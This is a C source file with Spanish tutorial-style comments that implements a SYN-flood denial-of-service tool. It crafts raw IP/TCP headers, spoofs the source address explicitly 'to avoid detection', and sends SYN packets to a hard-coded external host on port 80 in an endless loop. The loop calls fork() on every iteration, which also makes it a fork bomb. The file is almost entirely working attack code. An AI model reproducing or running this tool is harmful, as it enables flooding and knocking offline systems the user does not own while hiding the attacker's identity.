#include "flooder.h" /*Llamamos a nuestra seudolibrería
que deberá estar bajo el mismo directorio que
flooder.c */
 
int main (void)
{
    /* Creamos un raw socket
       *********************
       Raw socket significa que puede determinar cada sección de un paquete,
       ya sea encabezado o carga útil.
       Los sockets sin formato, digamos a lo crudo,
       permiten implementar nuevos protocolos IPv4 en el
       espacio de usuario.Un socket sin procesar
       recibe o envía el datagrama sin procesar no
       incluyendo los encabezados de nivel de enlace.
        La capa IPv4 genera una cabecera IP al enviar un paquete
        a menos que la opción de socket IP_HDRINCL esté habilitada en el socket.
        Cuando está habilitado, el paquete debe contener un encabezado IP.
        Esto significa que se pueden ejecutar sin dar
        información sobre la dirección
        IP de origen y la dirección MAC.
        Eso quiere decir, y es importante por su alcance,
        que si las aplicaciones que se ejecutan en la misma
        máquina, o en diferentes máquinas se están comunicando,
        entonces solo están intercambiando datos.
    */
    int Descriptor = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
    //Diseñamos el Datagrama que  representará nuestro paquete
    char datagram[4096] , IP_origen[32];//Espacio en memoria para el datagrama e IP
    //Cabecera de IP
    struct iphdr *iph = (struct iphdr *) datagram;
    //Cabecera de TCP
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct supuesto_encabezado  psh;
    strcpy(IP_origen , "192.166.156.10");
    /*pondremos la IP de origen que queramos
    que aparezca en el envío muy útil para
    la enseñanza con Wireshark...*/
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr ("8.9.6.4");
 
    memset (datagram, 0, 4096); /* Llenamos el buffer reservado de ceros */
 
    //Completamos el encabezado de IP
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->id = htons(54321);  /*Damos un número al paquete
    La función htonl () convierte el  entero
    sin signo del orden de bytes del host al orden de bytes de la red.*/
 
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;      /*Ponemos a  0 antes de calcular
    la suma de control o checksum*/
 
    iph->saddr = inet_addr ( IP_origen );    /*con el fin de no ser detectados
    podemos suplantar nuestra dirección de origen.*/
 
    iph->daddr = sin.sin_addr.s_addr;
 
    iph->check = Funcion_sum ((unsigned short *) datagram, iph->tot_len >> 1);
 
    //Cabecera de TCP.
    tcph->source = htons (1234);
    tcph->dest = htons (80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;      // primer y único segmento tcp
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons (5840); /* tamaño de ventana máximo permitido */
    tcph->check = 0;/* si establece una suma de verificación en cero,
    es importante saber quela pila de IP de su kernel
    debe completar la suma de verificación correcta durante la transmisión
    para que todo funcione correctamente sin mensajes  de error */
 
    tcph->urg_ptr = 0;
    /*Ahora debemos proceder a realizar
     la suma de comprobación de IP*/
 
    psh.Direccion_origen = inet_addr( IP_origen );
    psh.Direccion_destino = sin.sin_addr.s_addr;
    psh.Marcador = 0;
    psh.protocolo = IPPROTO_TCP;
    psh.tcp_longitud = htons(20);
 
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
 
    tcph->check = Funcion_sum( (unsigned short*) &psh , sizeof (struct supuesto_encabezado ));
 
    /*IP_HDRINCL muy importante que el KERNEL sepa
    los encabezados que están incluidos en el paquete*/
    int one = 1;
    const int *val = &one;
    if (setsockopt (Descriptor, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        printf ("Configuración de errores retornados IP_HDRINCL. Error número : %d . Error en el MENSAJE : %s \n" , errno , strerror(errno));
        exit(0);
    }
 
    //Para hacer un flood poderoso while lo ponemos a 1 :)
    while (1)
    {
        /*Para que el envío sea POTENTE y continuo de paquetes, nos
        ayudamos de la funcion fork, ya explicada en un programa anterior
        puesto por mi en la web del programador*/
        fork();
        if (sendto (Descriptor,      /* descriptor de nuestro  socket con la misma estructura
        tipo BSD kernel como  si abriesemos un fichero en ansi c*/
                    datagram,   /* el búfer que contiene encabezados y datos */
                    iph->tot_len,    /* Longitud total del datagrama */
                    0,      /*banderas de enrutamiento, normalmente siempre 0 */
                    (struct sockaddr *) &sin,   /* socket addr, en direccion sin */
                    sizeof (sin)) < 0)       /* envio anormal */
        {
            printf ("error\n");
        }
        //Si los datos se han enviado con éxito
        else
        {
            printf (" ÉXITO EN ENVIO. SÓLO PARA PRUEBA. SALIR:  pulsa Control C \n");
        }
    }
 
    return 0;
}